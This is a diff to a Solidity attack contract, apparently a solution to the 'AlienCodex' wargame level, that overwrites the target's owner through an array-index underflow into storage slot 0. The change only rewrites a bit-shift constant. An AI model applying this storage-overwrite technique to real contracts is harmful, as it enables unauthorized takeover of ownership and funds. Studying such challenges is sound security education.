@@ -14,7 +14,7 @@ contract AlienCodexAttack {
 
         target.revise(
             type(uint256).max - uint256(keccak256(abi.encode(uint32(1)))) + 1,
-            bytes32(bytes20(msg.sender)) >> 96
+            bytes32(bytes20(msg.sender)) >> (8 * 12)
         );
 
         require(msg.sender == target.owner(), "AlienCodex: Attack failed");
